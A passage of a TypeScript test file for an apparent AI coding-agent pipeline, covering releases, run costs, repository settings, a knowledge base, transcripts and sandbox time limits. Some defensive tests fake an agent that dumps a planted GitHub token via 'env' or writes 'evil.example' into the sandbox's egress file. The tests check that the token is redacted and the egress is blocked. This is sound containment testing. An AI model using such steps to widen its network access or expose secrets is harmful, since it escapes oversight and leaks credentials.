    expect((await getDb().select().from(task).where(eq(task.id, id)))[0].stage).toBe('done')
    expect((await deliveries(id)).filter((d) => d.kind === 'release')).toEqual([])
  })

  it('records the merge and the failure when the release object cannot be created afterwards', async () => {
    const id = await delivered()
    const failing = {
      ...githubApi,
      createRelease: async (_r: string, _t: string, input: { prerelease: boolean }) => {
        if (!input.prerelease) throw new Error('GitHub answered 403 creating the release')
        return { id: 1, tag: 'x', url: 'u' }
      },
    } as unknown as typeof githubApi

    const result = await release({ db: getDb(), github, api: failing }, id, {
      bump: 'patch',
      actor: 'human',
    })

    expect(result).toMatchObject({ tag: undefined, mergeSha: 'merge0001' })
    expect(result.releaseError).toContain('403')
    expect((await getDb().select().from(task).where(eq(task.id, id)))[0].stage).toBe('released')
    const released = (
      await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'released'))
    )[0]
    expect(released.detail).toMatchObject({ mergeSha: 'merge0001' })
  })

  describe('into a release branch that requires status checks', () => {
    const waits = () => getDb().select().from(releaseWait).orderBy(releaseWait.id)

    it('does not merge before the checks report: it turns auto-merge on, pinned to the head it saw', async () => {
      const id = await delivered()
      githubApi.releaseRequired = ['CI', 'SonarCloud Code Analysis']

      const result = await release(dependencies(), id, { bump: 'minor', actor: 'human' })

      expect(result).toMatchObject({
        tag: undefined,
        mergeSha: undefined,
        awaitingChecks: ['CI', 'SonarCloud Code Analysis'],
        pullRequestUrl: PR_URL,
      })
      // Only the integration merged; the promotion waits for GitHub.
      expect(githubApi.merges).toEqual([{ number: 12, sha: 'abc123def' }])
      expect(githubApi.autoMerges).toEqual([{ number: 12, sha: 'abc123def' }])
      expect(githubApi.releases.filter((r) => !r.prerelease)).toEqual([])
      expect(await waits()).toMatchObject([
        {
          taskId: id,
          repository: 'paulo/app',
          pullRequestNumber: 12,
          pullRequestUrl: PR_URL,
          sha: 'abc123def',
          releaseBranch: 'main',
          bump: 'minor',
          actor: 'human',
          changesets: false,
          checks: ['CI', 'SonarCloud Code Analysis'],
          status: 'waiting',
        },
      ])
      // Nothing is released yet, so nothing is recorded as released or watched.
      expect((await getDb().select().from(task).where(eq(task.id, id)))[0].stage).toBe('done')
      expect(await getDb().select().from(watch)).toEqual([])
      expect(await getDb().select().from(decision).where(eq(decision.taskId, id))).toEqual([])
    })

    it('records no publication for a changesets repository until the promotion lands', async () => {
      const id = await delivered()
      githubApi.releaseRequired = ['CI']
      githubApi.changesets = ['config.json', 'brave-fox.md']
      githubApi.changed = [added('.changeset/brave-fox.md')]

      const result = await release(dependencies(), id, { bump: 'patch', actor: 'human' })

      expect(result).toMatchObject({ publishing: 'changesets', awaitingChecks: ['CI'] })
      expect(await getDb().select().from(publication)).toEqual([])
      expect(await waits()).toMatchObject([{ changesets: true, status: 'waiting' }])
    })

    it('refuses a second release while one waits for the checks of the release pull request', async () => {
      const id = await delivered()
      githubApi.releaseRequired = ['CI']
      await release(dependencies(), id, { bump: 'patch', actor: 'human' })

      await expect(release(dependencies(), id, { bump: 'patch', actor: 'human' })).rejects.toThrow(
        /already waits for the checks of https:\/\/github.com\/paulo\/app\/pull\/12/,
      )
      expect(githubApi.autoMerges).toHaveLength(1)
      expect(await waits()).toHaveLength(1)
    })

    it('refuses, and records why, when GitHub will not turn auto-merge on', async () => {
      const id = await delivered()
      githubApi.releaseRequired = ['CI']
      githubApi.autoMergeRefused = true

      await expect(release(dependencies(), id, { bump: 'patch', actor: 'human' })).rejects.toThrow(
        /GitHub would not turn auto-merge on.*Auto merge is not allowed/,
      )
      expect(githubApi.merges).toHaveLength(1)
      expect((await getDb().select().from(task).where(eq(task.id, id)))[0].stage).toBe('done')
      const [refused] = await waits()
      expect(refused).toMatchObject({ status: 'refused' })
      expect(refused.detail).toContain('Auto merge is not allowed')
      expect(refused.endedAt).not.toBeNull()
    })

    it('merges the promotion at once, pinned to the head it saw, when GitHub refuses auto-merge because the checks already passed', async () => {
      const id = await delivered()
      githubApi.latest = 'v1.2.3'
      githubApi.releaseRequired = ['CI']
      githubApi.autoMergeRefused = true
      githubApi.autoMergeRefusal = CLEAN

      const result = await release(dependencies(), id, { bump: 'minor', actor: 'human' })

      expect(result).toMatchObject({ tag: 'v1.3.0', mergeSha: 'merge0001' })
      expect(result).not.toHaveProperty('awaitingChecks')
      expect(githubApi.merges).toEqual([
        { number: 12, sha: 'abc123def' },
        { number: 12, sha: 'abc123def' },
      ])
      expect(githubApi.mergeKinds.at(-1)).toEqual({ method: 'merge' })
      expect((await getDb().select().from(task).where(eq(task.id, id)))[0].stage).toBe('released')
      // Nothing waited, so no wait stays behind to block the next release.
      expect(await waits()).toEqual([])
    })

    it('still refuses the release when the refusal is not about a clean pull request', async () => {
      const id = await delivered()
      githubApi.releaseRequired = ['CI']
      githubApi.autoMergeRefused = true
      githubApi.autoMergeRefusal = 'Pull request Pull request is in unstable status'

      await expect(release(dependencies(), id, { bump: 'patch', actor: 'human' })).rejects.toThrow(
        /GitHub would not turn auto-merge on.*unstable status/,
      )
      expect(githubApi.merges).toHaveLength(1)
      expect(await waits()).toMatchObject([{ status: 'refused' }])
    })
  })
})

const runsOf = async (taskId: number) =>
  getDb().select().from(agentRun).where(eq(agentRun.taskId, taskId)).orderBy(agentRun.id)

describe('the cost of each execution', () => {
  it('records the builder and the reviewer as two executions, with their cost, time and outcome', async () => {
    const id = await seedTask()

    await runTask(deps(new FakeSandbox(changed())), id)

    const runs = await runsOf(id)
    expect(runs.map((r) => [r.role, r.harness, r.attempt, r.ok, r.quota])).toEqual([
      ['builder', 'fake-agent', 1, true, false],
      ['reviewer', 'fake-reviewer', 1, true, false],
    ])
    expect(runs[0].costUsd).toBeCloseTo(0.12)
    expect(runs[1].costUsd).toBeCloseTo(0.01)
    for (const r of runs) expect(r.durationMs).toBeGreaterThanOrEqual(0)
    const [row] = await getDb().select().from(task).where(eq(task.id, id))
    expect(row.costUsd).toBeCloseTo(runs.reduce((sum, r) => sum + (r.costUsd ?? 0), 0))
  })

  it('records every attempt, the rework and the second review included', async () => {
    const id = await seedTask()
    const builder = resumableBuilder()
    const reviewer = reviewerSaying(verdictJson('changes', [finding]), verdictJson('approve'))

    await runTask(deps(new FakeSandbox(changed()), { harness: builder, reviewer }), id)

    expect((await runsOf(id)).map((r) => [r.role, r.attempt])).toEqual([
      ['builder', 1],
      ['reviewer', 1],
      ['builder', 2],
      ['reviewer', 2],
    ])
    expect((await runsOf(id))[2].sessionId).toBe('sess-1')
  })

  it('records an agent that did not come back, with no cost', async () => {
    const id = await seedTask()
    const crashing: CodingHarness = {
      name: 'fake-agent',
      egress: agentEgress,
      run: async () => {
        throw new Error('the sandbox died')
      },
    }

    const result = await runTask(deps(new FakeSandbox(changed()), { harness: crashing }), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'build' })
    expect(await runsOf(id)).toMatchObject([
      { role: 'builder', ok: false, costUsd: null, quota: false },
    ])
  })

  it('records a quota stop as one, and not as a plain failure', async () => {
    const id = await seedTask()
    const limited: CodingHarness = {
      name: 'codex',
      egress: agentEgress,
      run: async () => ({
        ok: false,
        summary: 'limit',
        quota: { message: 'usage limit', resetsAt: 'tomorrow' },
      }),
    }

    await runTask(deps(new FakeSandbox(changed()), { harness: limited }), id)

    expect(await runsOf(id)).toMatchObject([
      { harness: 'codex', ok: false, quota: true, costUsd: null },
    ])
  })

  it('leaves the cost empty for an agent that reports none, instead of writing zero', async () => {
    const id = await seedTask()
    const silent: CodingHarness = {
      name: 'codex',
      egress: agentEgress,
      run: async () => {
        dirty = true
        return { ok: true, summary: 'done' }
      },
    }

    await runTask(deps(new FakeSandbox(changed()), { harness: silent }), id)

    expect((await runsOf(id))[0]).toMatchObject({ harness: 'codex', costUsd: null })
  })
})

describe('what the owner set for the repository', () => {
  const setRepo = (values: string) =>
    getPool().query(
      `insert into repository (full_name, enabled, ${values.split('|')[0]}) values ('Paulo/App', true, ${values.split('|')[1]})`,
    )

  beforeEach(async () => {
    await getPool().query('truncate table repository restart identity')
    dirty = true
  })

  it('runs the checks on a clean tree, without what the agent left in ignored files', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())

    await runTask(deps(sandbox), id)

    const commands = sandbox.backend.commands
    const clean = commands.findIndex((c) => c.endsWith('clean -fdxq'))
    const firstCheck = commands.findIndex((c) => c.endsWith('&& npm test'))
    expect(clean).toBeGreaterThan(-1)
    expect(clean).toBeLessThan(firstCheck)
    expect(commands[clean]).toMatch(/^git -C \S+ clean -fdxq$/)
  })

  it('runs the checks the owner chose, in place of npm test', async () => {
    await setRepo(
      `checks|'[{"name":"unit","command":"pnpm test"},{"name":"types","command":"pnpm typecheck"}]'`,
    )
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({ status: 'done' })
    const stored = await getDb().select().from(evidence).where(eq(evidence.taskId, id))
    expect(stored.map((e) => e.name).sort()).toEqual(['types', 'unit'])
    const commands = sandbox.backend.commands.join('\n')
    expect(commands).toContain('pnpm test')
    expect(commands).toContain('pnpm typecheck')
    expect(sandbox.backend.commands.filter((c) => c.endsWith('&& npm test'))).toEqual([])
  })

  it('adds the changeset check, against the integration branch, when the clone uses changesets', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(
      changed((command) =>
        command.includes('.changeset/config.json') ? { stdout: 'yes\n' } : undefined,
      ),
    )

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({ status: 'done' })
    const stored = await getDb().select().from(evidence).where(eq(evidence.taskId, id))
    expect(stored.map((e) => e.name).sort()).toEqual(['changeset', 'test'])
    expect(sandbox.backend.commands.join('\n')).toContain(
      'pnpm exec changeset status --since=origin/workspace',
    )
  })

  it('runs no changeset check when the clone has no changesets config', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(
      changed((command) =>
        command.includes('.changeset/config.json') ? { stdout: 'no\n' } : undefined,
      ),
    )

    await runTask(deps(sandbox), id)

    const stored = await getDb().select().from(evidence).where(eq(evidence.taskId, id))
    expect(stored.map((e) => e.name)).toEqual(['test'])
    expect(sandbox.backend.commands.join('\n')).not.toContain('changeset status')
  })

  it('opens the sandbox to the extra domains the owner listed, with no credential on them', async () => {
    await setRepo(`egress|'["pypi.org","files.pythonhosted.org"]'`)
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())

    await runTask(deps(sandbox), id)

    const byDomain = Object.fromEntries(sandbox.specs[0].egress.map((r) => [r.domain, r.headers]))
    expect(Object.keys(byDomain)).toEqual(
      expect.arrayContaining(['pypi.org', 'files.pythonhosted.org', 'registry.npmjs.org']),
    )
    expect(byDomain['pypi.org']).toBeUndefined()
  })

  it('uses the agent the owner set for the repository, and an issue label still wins', async () => {
    await setRepo(`harness, reviewer|'codex', 'claude-code'`)
    const seen: string[][] = []
    const pick = (labels: string[]) => {
      seen.push(labels)
      return okHarness
    }
    const id = await seedTask()
    await runTask(deps(new FakeSandbox(changed()), { harness: pick, reviewer: pick }), id)
    expect(seen[0]).toEqual(expect.arrayContaining(['harness:codex', 'reviewer:claude-code']))

    seen.length = 0
    await getPool().query('truncate table stage_event, task, ingress restart identity cascade')
    const second = await seedTask()
    await runTask(
      deps(new FakeSandbox(changed()), {
        harness: pick,
        reviewer: pick,
        fetchIssue: async () => ({
          number: 7,
          title: 't',
          body: '',
          labels: ['harness:claude-code'],
        }),
      }),
      second,
    )
    expect(seen[0]).toContain('harness:claude-code')
    expect(seen[0]).not.toContain('harness:codex')
  })

  it('lets the repository decide how far a release goes, over the factory default', async () => {
    await setRepo(`release_mode|'trial'`)
    const id = await seedTask()

    const result = await runTask(deps(new FakeSandbox(changed()), { releaseMode: 'manual' }), id)

    expect(result).toMatchObject({ status: 'done' })
    const decisions = await getDb().select().from(decision).where(eq(decision.taskId, id))
    expect(decisions.map((d) => d.kind)).toContain('would_release')
  })
})

/** A knowledge base that is ready, kept in memory, which remembers what the run kept and received. */
function knowledgeBase(): KnowledgeSource & { kept: NewNote[]; deliveries: unknown[] } {
  const kept: NewNote[] = []
  const deliveries: unknown[] = []
  return {
    kept,
    deliveries,
    pin: async () => ({
      repository: 'me/kb',
      knowledgeSha: 'k'.repeat(40),
      memorySha: 'm'.repeat(40),
    }),
    slice: async () => ({
      files: [{ path: 'knowledge/global/tests.md', content: Buffer.from('Write the test first.') }],
      left: [],
    }),
    delivered: async (input) => {
      deliveries.push(input)
    },
    keep: async (notes) => {
      kept.push(...notes)
    },
  }
}

describe('runTask with a knowledge base', () => {
  it('puts the base in the sandbox before the agents start, and tells the builder and the reviewer the same', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    const prompts: string[] = []
    const capture: CodingHarness = {
      name: 'capture',
      egress: agentEgress,
      run: async (_backend, { prompt }) => {
        prompts.push(prompt)
        return { ok: true, summary: 'done' }
      },
    }
    const reviewer = approving()
    const knowledge = knowledgeBase()

    await runTask(deps(sandbox, { harness: capture, reviewer, knowledge }), id)

    expect(sandbox.backend.files.get('/tmp/knowledge.next/knowledge/global/tests.md')).toBe(
      'Write the test first.',
    )
    const rules = knowledgeRules('/tmp/knowledge')
    expect(prompts[0]).toContain(rules)
    expect(prompts[0]).toContain('LEARNED:')
    expect(reviewer.prompts[0]).toContain(rules)
    expect(knowledge.deliveries).toEqual([
      expect.objectContaining({ recipient: { taskId: id }, project: 'paulo/app', files: 1 }),
    ])
    const [build] = await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'build'))
    expect((build.detail as { knowledge?: unknown }).knowledge).toEqual(await knowledge.pin())
  })

  it('keeps what the builder learned for the next run on the same project', async () => {
    const id = await seedTask()
    const learned: CodingHarness = {
      name: 'learned',
      egress: agentEgress,
      run: async () => ({
        ok: true,
        summary: 'Added truncate.\nLEARNED: the tests of this repo run with pnpm vitest run',
      }),
    }
    const knowledge = knowledgeBase()

    await runTask(deps(new FakeSandbox(changed()), { harness: learned, knowledge }), id)

    expect(knowledge.kept).toEqual([
      {
        repository: 'paulo/app',
        kind: 'learned',
        body: 'the tests of this repo run with pnpm vitest run',
        taskId: id,
        issueNumber: 7,
        baseSha: 'abc123def',
      },
    ])
  })

  describe('an issue the code already resolves', () => {
    const untouched = (extra?: (command: string) => Reply | undefined) =>
      new FakeSandbox(
        changed(
          (c) => extra?.(c) ?? (c.includes('status --porcelain') ? { stdout: '' } : undefined),
        ),
      )
    const already: CodingHarness = {
      name: 'already',
      egress: agentEgress,
      run: async () => ({
        ok: true,
        summary: 'truncate already exists in src/truncate.js, tested in test/truncate.test.js',
        costUsd: 0.07,
      }),
    }

    it('closes the issue with the evidence once the checks pass and the reviewer confirms it', async () => {
      const id = await seedTask()
      const reviewer = reviewerSaying(
        verdictJson('approve', [], 'src/truncate.js does it and test/truncate.test.js covers it'),
      )

      const result = await runTask(deps(untouched(), { harness: already, reviewer }), id)

      expect(result).toMatchObject({ status: 'resolved', sha: 'abc123def' })
      expect(githubApi.closed).toEqual([7])
      expect(githubApi.comments).toHaveLength(1)
      expect(githubApi.comments[0]).toContain('already resolved at abc123def')
      expect(githubApi.comments[0]).toContain('truncate already exists in src/truncate.js')
      expect(githubApi.comments[0]).toContain(
        'src/truncate.js does it and test/truncate.test.js covers it',
      )
      expect(githubApi.pulls).toEqual([])
      expect(githubApi.checkRuns).toEqual([])
      expect(reviewer.prompts[0]).toMatch(/claim, not evidence/)
      const [row] = await getDb().select().from(task).where(eq(task.id, id))
      expect(row).toMatchObject({ stage: 'done', resolvedSha: 'abc123def', pullRequestUrl: null })
      expect(await stagesOf(id)).toEqual(['sandbox', 'build', 'verify', 'review', 'done'])
    })

    it('leaves the issue open for a person when the checks fail at the commit', async () => {
      const id = await seedTask()
      const sandbox = untouched((c) =>
        c.endsWith('npm test') ? { exitCode: 1, stdout: 'not ok 1 - truncate' } : undefined,
      )

      const result = await runTask(deps(sandbox, { harness: already }), id)

      expect(result).toMatchObject({ status: 'failed', stage: 'verify' })
      expect(result.status === 'failed' && result.error).toMatch(
        /^the agent made no change to the repository, and the checks did not pass at abc123d/,
      )
      expect(githubApi.closed).toEqual([])
      expect(githubApi.comments).toEqual([])
    })

    it('leaves the issue open for a person when the reviewer finds something missing', async () => {
      const id = await seedTask()
      const reviewer = reviewerSaying(
        verdictJson('changes', [finding], 'no test for an empty string'),
      )

      const result = await runTask(deps(untouched(), { harness: already, reviewer }), id)

      expect(result).toMatchObject({ status: 'failed', stage: 'review' })
      expect(result.status === 'failed' && result.error).toContain(
        'the reviewer did not confirm the issue is resolved: no test for an empty string',
      )
      expect(githubApi.closed).toEqual([])
    })

    /** A builder that claims the issue is resolved, then does `then` when the reviewer disagrees. */
    function claimsThen(then: 'builds' | 'insists'): CodingHarness & { told: string[] } {
      const told: string[] = []
      return {
        name: 'claimer',
        egress: agentEgress,
        told,
        run: async () => {
          dirty = false
          return {
            ok: true,
            summary: 'truncate already exists',
            costUsd: 0.07,
            sessionId: 'sess-9',
          }
        },
        resume: async (_backend, sessionId, input) => {
          told.push(`${sessionId}: ${input.prompt}`)
          if (then === 'builds') dirty = true
          return {
            ok: true,
            summary: then === 'builds' ? 'added the empty-string case' : 'it needs B-516 first',
            costUsd: 0.05,
            sessionId,
          }
        },
      }
    }

    it('sends a claim the reviewer refutes back to the same session, and delivers the change it then makes', async () => {
      const id = await seedTask()
      const builder = claimsThen('builds')
      const reviewer = reviewerSaying(
        verdictJson('changes', [finding], 'no test for an empty string'),
        verdictJson('approve'),
      )

      const result = await runTask(
        deps(new FakeSandbox(changed()), { harness: builder, reviewer }),
        id,
      )

      expect(result).toMatchObject({ status: 'done', pullRequestUrl: PR_URL })
      expect(builder.told).toHaveLength(1)
      expect(builder.told[0]).toMatch(/^sess-9: /)
      expect(builder.told[0]).toContain('no test for an empty string')
      expect(builder.told[0]).toContain(finding.issue)
      expect(githubApi.closed).toEqual([])
      expect(await stagesOf(id)).toEqual([
        'sandbox',
        'build',
        'verify',
        'review',
        'build',
        'push',
        'verify',
        'review',
        'pr',
        'done',
      ])
    })

    it('fails with what the agent said after the review when it still changes nothing', async () => {
      const id = await seedTask()
      const builder = claimsThen('insists')
      const reviewer = reviewerSaying(
        verdictJson('changes', [finding], 'no test for an empty string'),
      )
      const sandbox = new FakeSandbox(changed())

      const result = await runTask(deps(sandbox, { harness: builder, reviewer }), id)

      expect(result).toMatchObject({ status: 'failed', stage: 'build' })
      expect(result.status === 'failed' && result.error).toBe(
        'the agent made no change to the repository, and the reviewer did not confirm the issue is resolved: no test for an empty string. Sent back with the review, the agent still changed nothing and said: it needs B-516 first',
      )
      expect(pushesOf(sandbox)).toEqual([])
      expect(githubApi.closed).toEqual([])
    })

    it('does not send back a claim the reviewer could not judge', async () => {
      const id = await seedTask()
      const builder = claimsThen('builds')
      const reviewer = reviewerSaying('no verdict here')

      const result = await runTask(
        deps(new FakeSandbox(changed()), { harness: builder, reviewer }),
        id,
      )

      expect(result).toMatchObject({ status: 'failed', stage: 'review' })
      expect(builder.told).toEqual([])
    })

    it('does not close the issue when the comment with the evidence cannot be posted', async () => {
      const id = await seedTask()
      const broken = {
        ...githubApi,
        commentOnIssue: async () => {
          throw new Error('GitHub answered 403 commenting')
        },
      }

      const result = await runTask(deps(untouched(), { harness: already, githubApi: broken }), id)

      expect(result).toMatchObject({ status: 'failed' })
      expect(githubApi.closed).toEqual([])
    })
  })

  it('remembers an issue a run found nothing to change in, with what the agent said', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(
      changed((c) => (c.includes('status --porcelain') ? { stdout: '' } : undefined)),
    )
    const already: CodingHarness = {
      name: 'already',
      egress: agentEgress,
      run: async () => ({ ok: true, summary: 'truncate already exists in src/truncate.js' }),
    }
    const knowledge = knowledgeBase()

    await runTask(deps(sandbox, { harness: already, knowledge }), id)

    expect(knowledge.kept).toHaveLength(1)
    expect(knowledge.kept[0]).toMatchObject({ kind: 'no-change', issueNumber: 7 })
    expect(knowledge.kept[0].body).toBe(
      'Issue #7 (Add truncate): a run starting from abc123def found nothing to change. The agent said: truncate already exists in src/truncate.js',
    )
  })

  it('tells the agent nothing about a base while none is ready', async () => {
    const id = await seedTask()
    const prompts: string[] = []
    const capture: CodingHarness = {
      name: 'capture',
      egress: agentEgress,
      run: async (_backend, { prompt }) => {
        prompts.push(prompt)
        return { ok: true, summary: 'done\nLEARNED: something worth keeping here' }
      },
    }
    const knowledge = { ...knowledgeBase(), pin: async () => undefined }

    await runTask(deps(new FakeSandbox(changed()), { harness: capture, knowledge }), id)

    expect(prompts[0]).not.toContain('/tmp/knowledge')
    expect(knowledge.kept).toEqual([])
  })
})

describe('the transcript of a run', () => {
  const PLANTED = 'ghs_plantedTokenThatMustNeverBeStored01'

  it('stores what each agent did, in order across the builder and the reviewer, with no token in it', async () => {
    const id = await seedTask()
    const builder: CodingHarness = {
      name: 'fake-agent',
      egress: agentEgress,
      run: async (_backend, input) => {
        input.onEvent?.({ kind: 'message', content: 'Reading AGENTS.md.' })
        input.onEvent?.({ kind: 'tool_use', tool: 'Bash', content: 'command: env' })
        input.onEvent?.({ kind: 'tool_result', content: `GH_TOKEN=${PLANTED}` })
        dirty = true
        return { ok: true, summary: 'added truncate', costUsd: 0.12 }
      },
    }
    const reviewer: CodingHarness = {
      name: 'fake-reviewer',
      egress: async () => [],
      run: async (_backend, input) => {
        input.onEvent?.({ kind: 'message', content: 'Looks right.' })
        return { ok: true, summary: verdictJson('approve'), costUsd: 0.01 }
      },
    }

    const result = await runTask(
      deps(new FakeSandbox(changed()), { harness: builder, reviewer }),
      id,
    )

    expect(result).toMatchObject({ status: 'done' })
    const events = await eventsOf(getDb(), id)
    expect(events.map((e) => [e.seq, e.role, e.kind])).toEqual([
      [1, 'builder', 'message'],
      [2, 'builder', 'tool_use'],
      [3, 'builder', 'tool_result'],
      [4, 'reviewer', 'message'],
    ])
    expect(events[2].content).toBe('GH_TOKEN=[redacted]')
    expect(JSON.stringify(events)).not.toContain(PLANTED)
  })

  it('reads only the events after the last one a client has', async () => {
    const id = await seedTask()
    const builder: CodingHarness = {
      name: 'fake-agent',
      egress: agentEgress,
      run: async (_backend, input) => {
        for (let i = 1; i <= 5; i += 1) input.onEvent?.({ kind: 'message', content: `step ${i}` })
        dirty = true
        return { ok: true, summary: 'done', costUsd: 0.1 }
      },
    }
    await runTask(deps(new FakeSandbox(changed()), { harness: builder }), id)

    const after = await eventsOf(getDb(), id, { afterSeq: 3 })
    expect(after.map((e) => e.content)).toEqual(['step 4', 'step 5'])
  })
})

describe("a project's recipe", () => {
  const recipe = {
    install: 'pnpm install',
    checks: [{ name: 'test', command: 'pnpm test' }],
    egress: ['files.example.org'],
  }
  const domainsOf = (sandbox: FakeSandbox) => sandbox.specs[0].egress.map((e) => e.domain)

  it('runs without a domain the recipe asks for until the owner approves it, and with it after', async () => {
    const asked: string[] = []
    const fetchRecipe = async (repo: string, token: string) => {
      asked.push(`${repo} ${token}`)
      return recipe
    }
    await getDb().insert(repository).values({ fullName: 'paulo/app', enabled: true })
    const before = new FakeSandbox(changed())
    await runTask(deps(before, { fetchRecipe }), await seedTask(7))
    expect(domainsOf(before)).not.toContain('files.example.org')
    expect(asked).toEqual([`paulo/app ${TOKEN}`])

    await getDb()
      .update(repository)
      .set({ approvedRecipeEgress: ['files.example.org'] })
      .where(eq(repository.fullName, 'paulo/app'))
    const after = new FakeSandbox(changed())
    await runTask(deps(after, { fetchRecipe }), await seedTask(8))
    expect(domainsOf(after)).toContain('files.example.org')
  })

  it("runs the recipe's install and checks when the panel sets none", async () => {
    const sandbox = new FakeSandbox(changed())
    const id = await seedTask()
    await runTask(deps(sandbox, { fetchRecipe: async () => recipe }), id)
    const checked = await getDb().select().from(evidence).where(eq(evidence.taskId, id))
    expect(checked.map((e) => e.command)).toEqual(['pnpm install', 'pnpm test'])
  })

  it('reads the recipe before any sandbox exists, so what the agent writes to the file changes nothing', async () => {
    let sandboxes = 0
    const sandbox = new FakeSandbox(
      changed((command) =>
        command.includes('.factory/setup.json')
          ? { stdout: '{"egress":["evil.example"]}' }
          : undefined,
      ),
    )
    const create = sandbox.create.bind(sandbox)
    sandbox.create = async (spec) => {
      sandboxes += 1
      return create(spec)
    }
    let readWhenSandboxes = -1
    const fetchRecipe = async () => {
      readWhenSandboxes = sandboxes
      return undefined
    }
    await runTask(deps(sandbox, { fetchRecipe }), await seedTask())
    expect(readWhenSandboxes).toBe(0)
    expect(domainsOf(sandbox)).not.toContain('evil.example')
  })

  it('fails the run and names the file when the recipe cannot be used', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    const result = await runTask(
      deps(sandbox, {
        fetchRecipe: async (repo) => parseRecipe(repo, '{"egress":["*"]}'),
      }),
      id,
    )
    expect(result).toMatchObject({ status: 'failed' })
    expect(sandbox.specs).toEqual([])
    const [row] = await getDb().select().from(task).where(eq(task.id, id))
    expect(row.stage).toBe('failed')
  })
})

describe('runTask agent time', () => {
  const MIN = 60_000
  const timeouts = { sandboxMs: 60 * MIN, agentMs: 45 * MIN }

  afterEach(() => {
    vi.restoreAllMocks()
  })

  it('cuts the first build so the checks and the review still fit in the sandbox', async () => {
    const id = await seedTask()
    const given: number[] = []
    const builder: CodingHarness = {
      ...okHarness,
      run: async (_backend, input) => {
        given.push(input.timeoutMs ?? 0)
        return { ok: true, summary: 'added truncate', costUsd: 0.12 }
      },
    }

    await runTask(deps(new FakeSandbox(changed()), { harness: builder, timeouts }), id)

    // 60 minutes of sandbox, 25 kept for the checks and the review: at most 35 for the agent, not 45.
    expect(given).toHaveLength(1)
    expect(given[0]).toBeLessThanOrEqual(35 * MIN)
    expect(given[0]).toBeGreaterThan(34 * MIN)
  })

  it('fails a rework that has no time left with a message saying so, instead of starting it', async () => {
    const id = await seedTask()
    const start = Date.now()
    const builder = resumableBuilder()
    const first = builder.run
    builder.run = async (backend, input) => {
      // The first build took 38 of the sandbox's 60 minutes.
      vi.spyOn(Date, 'now').mockReturnValue(start + 31.5 * MIN)
      return first(backend, input)
    }
    const reviewer = reviewerSaying(verdictJson('changes', [finding], 'max=0 slips through'))

    const result = await runTask(
      deps(new FakeSandbox(changed()), { harness: builder, reviewer, timeouts }),
      id,
    )

    expect(result).toMatchObject({ status: 'failed' })
    expect(builder.resumed).toHaveLength(0)
    const [failed] = await getDb()
      .select()
      .from(stageEvent)
      .where(eq(stageEvent.taskId, id))
      .orderBy(desc(stageEvent.id))
      .limit(1)
    expect((failed.detail as { error: string }).error).toMatch(
      /no time left for another agent pass: 31 of the sandbox's 60 minutes/,
    )
  })

  it('refuses as before when the provider has a session cap but cannot save a sandbox', async () => {
    const id = await seedTask()
    const start = Date.now()
    const sandbox = new FakeSandbox(changed())
    const create = sandbox.create.bind(sandbox)
    Object.assign(sandbox, { maxSessionMs: 60 * MIN })
    sandbox.create = async (spec) => ({ ...(await create(spec)), snapshot: undefined })
    const builder = resumableBuilder()
    const first = builder.run
    builder.run = async (backend, input) => {
      vi.spyOn(Date, 'now').mockReturnValue(start + 36.5 * MIN)
      return first(backend, input)
    }
    const reviewer = reviewerSaying(verdictJson('changes', [finding], 'max=0 slips through'))

    const result = await runTask(
      deps(sandbox, {
        harness: builder,
        reviewer,
        timeouts: { sandboxMs: 90 * MIN, agentMs: 45 * MIN },
      }),
      id,
    )

    expect(result).toMatchObject({ status: 'failed' })
    expect(builder.resumed).toHaveLength(0)
    expect(sandbox.restored).toEqual([])
    const [failed] = await getDb()
      .select()
      .from(stageEvent)
      .where(eq(stageEvent.taskId, id))
      .orderBy(desc(stageEvent.id))
      .limit(1)
    expect((failed.detail as { error: string }).error).toMatch(/36 of the sandbox's 60 minutes/)
  })

  it("moves the disk to a new session when the provider's hour has no room for a rework", async () => {
    const id = await seedTask()
    const start = Date.now()
    const sandbox = new FakeSandbox(changed())
    Object.assign(sandbox, { maxSessionMs: 60 * MIN })
    const builder = resumableBuilder()
    const first = builder.run
    builder.run = async (backend, input) => {
      // The first build took 36 of the session's 60 minutes; the run's 90 still leave room.
      vi.spyOn(Date, 'now').mockReturnValue(start + 36 * MIN)
      return first(backend, input)
    }
    const given: number[] = []
    const resume = builder.resume!
    builder.resume = async (backend, sessionId, input) => {
      given.push(input.timeoutMs ?? 0)
      return resume(backend, sessionId, input)
    }
    const reviewer = reviewerSaying(
      verdictJson('changes', [finding], 'max=0 slips through'),
      verdictJson('approve'),
    )

    const result = await runTask(
      deps(sandbox, {
        harness: builder,
        reviewer,
        timeouts: { sandboxMs: 90 * MIN, agentMs: 45 * MIN },
      }),
      id,
    )

    expect(result).toMatchObject({ status: 'done' })
    expect(builder.resumed).toHaveLength(1)
    expect(sandbox.snapshots).toEqual(['snap-1'])
    expect(sandbox.restored).toEqual(['snap-1'])
    expect(sandbox.deleted).toEqual(['snap-1'])
    // The new session has the same egress policy as the first one, with the token the run holds now.
    expect(sandbox.specs[1]!.egress).toEqual(sandbox.specs[0]!.egress)
    expect(sandbox.specs[1]!.egress).toContainEqual(githubEgress(TOKEN))
    // The run's own budget still bounds the rework: 90 - 36 - (15 + 10) = 29 minutes. The run's clock
    // started a few milliseconds after `start`.
    expect(given[0]).toBeLessThanOrEqual(29 * MIN + 1_000)
    expect(given[0]).toBeGreaterThan(28 * MIN)
    const events = await getDb()
      .select()
      .from(stageEvent)
      .where(eq(stageEvent.taskId, id))
      .orderBy(stageEvent.id)
    const renewed = events.find((e) => (e.detail as { renewed?: boolean } | null)?.renewed)
    expect(renewed).toMatchObject({ stage: 'sandbox', detail: { provider: 'fake', renewed: true } })
  })
})
